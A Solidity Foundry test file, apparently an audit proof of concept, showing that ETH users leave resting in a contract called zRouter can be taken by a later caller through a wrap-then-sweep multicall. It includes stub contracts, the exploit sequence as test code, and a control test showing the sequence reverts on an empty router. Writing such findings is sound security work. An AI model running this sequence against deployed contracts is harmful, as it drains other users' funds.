// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import { Test } from "forge-std/Test.sol";
import { zRouter, ChainConfig } from "../../../src/peripherals/zRouter.sol";

/// @dev WETH9 as far as these legs touch it: the swapV3 callback wraps ETH through `receive()` and
///      ERC-20-transfers the wrap to the pool.
contract StubWETH {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    receive() external payable {
        balanceOf[msg.sender] += msg.value;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (allowance[from][msg.sender] != type(uint256).max) allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev Minimal ERC-20: the swap output the victim strands in the router.
contract StubToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

/// @dev A zAMM that consumes exactly 1 wei of input and returns that as its reported amountIn, so an
///      exact-out leg leaves `amountLimit - 1` sitting in the router.
contract StubZAMM {
    uint256 internal constant COST = 1 wei;

    fallback() external payable {
        if (msg.value > COST) {
            (bool ok,) = msg.sender.call{ value: msg.value - COST }("");
            require(ok, "refund");
        }
        assembly {
            mstore(0x00, COST)
            return(0x00, 0x20)
        }
    }

    receive() external payable { }
}

/**
 * @title H02_ZRouterResting
 * @notice Claim: value a victim leaves resting in `zRouter` at the end of their own transaction — an
 *         exact-out overpayment with `to == address(this)`, which is how a multicall chains one leg's
 *         output into the next and what strands change if the chain stops early — is claimable by a
 *         DIFFERENT caller in a LATER transaction.
 *
 *         The claimant needs no privilege: they run `deposit(address(0), 0, X)` with `X` equal to the
 *         resting sum, which tstamps a transient credit of `X` against the router's own ETH slot
 *         without paying, and then `sweep` — gated only by `_requireOwnBalance`, which reads that
 *         credit — moves the victim's ETH out. A T4 front-runner takes it; nobody in between can see
 *         the resting balance as anything but the router's.
 */
contract H02ZRouterRestingTest is Test {
    StubWETH internal weth;
    StubToken internal tokenOut;
    StubZAMM internal zamm;
    zRouter internal router;

    address internal owner = address(uint160(0x0FF1CE));
    address internal victim = address(uint160(0x1234));
    address internal attacker = address(uint160(0xBAD1));

    function setUp() public {
        weth = new StubWETH();
        tokenOut = new StubToken();
        zamm = new StubZAMM();

        ChainConfig memory c;
        c.weth = address(weth);
        c.zamm = address(zamm);
        router = new zRouter(c, owner);
    }

    /// THE CLAIM. A victim chains two exact-out legs with `to == address(this)` and the chain stops
    /// after the first: the change from their own overpayment rests in the router at the end of their
    /// transaction (1 ETH in, a 1 wei fill, so 1 ether - 1 wei rests). A later T4 caller who has sent
    /// NOTHING to the router credits that same number through `wrap` — which moves no value at all,
    /// pushes the router's OWN balance onto its WETH credit slot, and is payable by anyone — and then
    /// `sweep`s the wrapped token out. The transient credit cannot tell whose wei it is describing.
    function test_Attacker_TakesStrandedChangeThroughWrapCreditAndSweep() public {
        // The victim's own transaction: an exact-out swapVZ into the router itself, paid 1 ether for a
        // 1 wei fill. `to == address(this)` is the chaining shape; here nothing consumes the credit.
        vm.deal(victim, 1 ether);
        vm.prank(victim);
        router.swapVZ{ value: 1 ether }({
            to: address(router),
            exactOut: true,
            feeOrHook: 30,
            tokenIn: address(0),
            tokenOut: address(tokenOut),
            idIn: 0,
            idOut: 0,
            swapAmount: 1,
            amountLimit: 1 ether,
            deadline: block.timestamp + 1
        });

        assertEq(address(router).balance, 1 ether - 1 wei, "the victim's change rests in the router");

        // The attacker, a different T4 caller in a later transaction, with no ETH of their own.
        assertEq(attacker.balance, 0, "the attacker starts with nothing");

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(zRouter.wrap, (0)); // amount == 0 means "wrap the whole balance"
        calls[1] = abi.encodeCall(zRouter.sweep, (address(weth), 0, 1 ether - 1 wei, attacker));

        vm.prank(attacker);
        router.multicall(calls); // msg.value == 0: the wrap leg costs the attacker nothing

        assertEq(weth.balanceOf(attacker), 1 ether - 1 wei, "the attacker left with the victim's stranded change");
        assertEq(address(router).balance, 0, "and the router holds none of it");
    }

    /// Non-vacuity: the identical `wrap`+`sweep` on an EMPTY router is refused. The attack works only
    /// because a previous transaction left a balance the credit counter cannot tell apart from this
    /// transaction's own staging.
    function test_Defended_SameSequenceOnAnEmptyRouterIsRefused() public {
        assertEq(address(router).balance, 0, "nothing rests in the router");

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(zRouter.wrap, (0));
        calls[1] = abi.encodeCall(zRouter.sweep, (address(weth), 0, type(uint256).max, attacker));

        vm.prank(attacker);
        vm.expectRevert(zRouter.Unauthorized.selector);
        router.multicall(calls);
    }

    /// The other stranded-value shape named in the claim: a `deposit` not fully used. The victim
    /// deposits 1 ETH and sweeps only half back in their own transaction; the other half rests. The
    /// later T4 caller takes it the same way.
    function test_Attacker_TakesHalfUsedDeposit() public {
        vm.deal(victim, 1 ether);
        bytes[] memory setup = new bytes[](2);
        setup[0] = abi.encodeCall(zRouter.deposit, (address(0), 0, 1 ether));
        setup[1] = abi.encodeCall(zRouter.sweep, (address(0), 0, 0.5 ether, victim));

        vm.prank(victim);
        router.multicall{ value: 1 ether }(setup);

        assertEq(address(router).balance, 0.5 ether, "half the deposit was left behind");

        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeCall(zRouter.wrap, (0));
        calls[1] = abi.encodeCall(zRouter.sweep, (address(weth), 0, 0.5 ether, attacker));

        vm.prank(attacker);
        router.multicall(calls);

        assertEq(weth.balanceOf(attacker), 0.5 ether, "the later caller took the remainder");
        assertEq(address(router).balance, 0, "and nothing is left");
    }
}
